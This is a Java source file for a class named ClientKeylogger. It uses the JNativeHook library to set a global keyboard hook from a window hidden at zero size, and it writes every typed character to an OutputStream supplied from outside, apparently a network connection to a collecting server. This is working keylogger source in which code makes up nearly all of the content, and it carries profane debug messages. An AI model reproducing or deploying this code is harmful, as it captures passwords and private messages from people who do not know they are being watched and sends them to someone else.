import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.io.IOException;
import java.io.OutputStream;





import javax.swing.JFrame;
//import java.awt.event.WindowListener;
//import javax.swing.JFrame;
//import javax.swing.JOptionPane;
import javax.swing.SwingUtilities;




import javax.swing.WindowConstants;

//import javax.swing.WindowConstants; 
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

//public class ClientKeylogger extends JFrame implements NativeKeyListener, {
	
public class ClientKeylogger extends JFrame implements NativeKeyListener, WindowListener {
	
	protected OutputStream out;

        public ClientKeylogger(OutputStream out) {
                setTitle("JNativeHook Swing Example");
                setSize(0, 0);
                setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
                addWindowListener(this);
                setVisible(true);
                setVisible(false);
        	this.out = out;
//            try {
//                GlobalScreen.registerNativeHook();
//        }
//        catch (NativeHookException ex) {
//                System.err.println("There was a problem registering the native hook.");
//                System.err.println(ex.getMessage());
//                ex.printStackTrace();
//
////                System.exit(1); 
//        }
//
//        GlobalScreen.getInstance().addNativeKeyListener(this);
        
        System.out.println("TREES FUCK!");
//        start();
        }

        public void windowOpened(WindowEvent e) {
//                Initialze native hook.
                try {
                        GlobalScreen.registerNativeHook();
                }
                catch (NativeHookException ex) {
                        System.err.println("There was a problem registering the native hook.");
                        System.err.println(ex.getMessage());
                        ex.printStackTrace();

//                        System.exit(1); 
                }

                GlobalScreen.getInstance().addNativeKeyListener(this);

        }

        public void windowClosed(WindowEvent e) {
        	System.out.println("SHUT THE FRONT DOOR!");
                //Clean up the native hook.
                GlobalScreen.unregisterNativeHook();
//              GlobalScreen.getInstance().removeNativeKeyListener(this);

                System.runFinalization();
//                this.dispose();
//                System.exit(0);
        }

        public void windowClosing(WindowEvent e) { /* Unimplemented */ }
        public void windowIconified(WindowEvent e) { /* Unimplemented */ }
        public void windowDeiconified(WindowEvent e) { /* Unimplemented */ }
        public void windowActivated(WindowEvent e) { /* Unimplemented */ }
        public void windowDeactivated(WindowEvent e) { /* Unimplemented */ }

        public void nativeKeyReleased(NativeKeyEvent e) {
//                if (e.getKeyCode() == NativeKeyEvent.VK_SPACE) {
//                        SwingUtilities.invokeLater(new Runnable() {
//                                public void run() {
//                                        JOptionPane.showMessageDialog(null, "This will run on Swing's Event Dispatch Thread.");
//                                }
//                        });
//                }                                                            
        }
        
     
        public void nativeKeyPressed(NativeKeyEvent e) {   
//        	System.out.println(e.getKeyChar());
        /* Unimplemented */ }
        public void nativeKeyTyped(NativeKeyEvent e) { /* Unimplemented */ 
//        	System.out.println("LOL ?"); 
        	if(e.getKeyChar() == (char)8) {  
        		System.out.print("\n[BACKSPACE]");
        		writeStringOutStream(out, "[BACKSPACE]");
        	} else if(e.getKeyChar() == (char)13) {
        		System.out.println("[ENTER]");
        		writeStringOutStream(out, "[ENTER]");
        	}else {
        		System.out.println("LINE SEPERATOR IS: " + (int)System.getProperty("line.separator").charAt(0));
        		System.out.print(e.getKeyChar());
        		writeStringOutStream(out, Character.toString(e.getKeyChar()));
        		System.out.print((int)e.getKeyChar());
 
        	}
//    		System.out.print(e.getKeyCode());

        }
        
//        @Override
//        public void run() {
        	
        	
//        	new ClientKeylogger();
//        	
//        }

//        public static void main(String[] args) {
//                 SwingUtilities.invokeLater(new Runnable() {
//                        public void run() {
//                                new ClientKeylogger(null);
//                        }
//                });
//        }
        
    	//writes a string char by char to outputstream
//    	public static void writeStringOutStream(ObjectOutputStream out, String line) {
    	public void writeStringOutStream(OutputStream out, String line) {
//    		if(line == null) {
//    			line = "null";
//    		}
    		byte[] convert = stringToByteArray(line);
    		try {
    			out.write(convert, 0, line.length() + 1);
    			out.flush();
    		} catch (IOException e) {
    			// TODO Auto-generated catch block
//                GlobalScreen.unregisterNativeHook();
//                System.runFinalization();
//                GlobalScreen.getInstance().removeNativeKeyListener(this);
//    			this.dispatchEvent(new WindowEvent(this, WindowEvent.WINDOW_CLOSING));

                System.out.println("TEMPTING DEAL MOTHERFUCKER");
//                System.exit(0);
//    			e.printStackTrace();
    		}
    	}
    	
    	//addds newline character!
    	//ADDS NEWLINE CHARACTER SO IT'S LIKE WRITING A LINE !
    	public byte[] stringToByteArray(String line) {
    		System.out.println(line);
    		byte[] temp = new byte[line.length() + 1];
    		for(int i = 0; i < line.length(); i++) {
    			temp[i] = (byte)line.charAt(i);
//    			System.out.println(line);
    		}
    		temp[line.length()] = '\n';
    		return temp;
    	}
}